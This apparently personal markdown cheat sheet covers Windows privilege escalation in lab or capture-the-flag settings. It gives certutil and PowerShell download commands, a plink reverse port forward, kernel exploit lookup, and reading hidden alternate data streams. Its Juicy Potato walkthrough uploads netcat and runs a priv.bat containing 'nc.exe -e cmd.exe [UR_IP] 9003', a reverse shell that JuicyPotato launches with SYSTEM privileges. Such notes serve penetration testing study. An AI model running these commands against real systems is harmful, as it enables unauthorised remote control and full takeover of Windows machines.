
Download file on the machine
```cmd
certutil -urlcache -f "<URL>" "<output_filename>"
powershell -Command "Invoke-WebRequest -Uri 'http://IP/FILE' -OutFile 'FILE'"
```

Port Forward port only available internally
```cmd
plink.exe -l root -pw root -R [Port]:127.0.0.1:[Port] [Ur_IP]
```
# Kernel Exploit

[Windows Kernel Exploit]([https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits))

Use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) to find Vuln , first on you attacker machine
```bash
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
```

Search online if any exploit is found

# WLS Escalation

To find where is the wls.exe
```cmd
where /R c:\ wsl.exe
```

# Potato Attack

See privilege first with 
```cmd
whoami /priv
```

Need to have one of these 2 privileges
```cmd
SeAssignPrimaryToken
SeImpersonate
```

And A COM server with a unique CLSID. The authors of juicy Potato compiled lists of unique CLSIDs for different Windows versions to abuse — [**_http://ohpe.it/juicy-potato/CLSID/_**](http://ohpe.it/juicy-potato/CLSID/).

https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-impersonation-privileges

[Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

[Juicy Potato](https://github.com/ohpe/juicy-potato)

1. Upload netcat to the victim
2. Upload a priv.bat file to the victim
```
C:\Users\kohsuke\Desktop\nc.exe -e cmd.exe [UR_IP] 9003
```
3. Listen on your machine
4. Upload JuicyPotato the the victim
5. Run JuicyPotato
```
jp.exe -p priv.bat -l 9003 -t * -c [CLSID]
```

# Alternate Data Stream

To see alternate data stream
```cmd
dir /R

EX : 34 hm.txt:root.txt:$DATA
```

To read it
```cmd
powershell -Command "Get-Content -Path 'hm.txt' -Stream 'root.txt'"

OR

more < hm.txt:root.txt:$DATA
```

# 
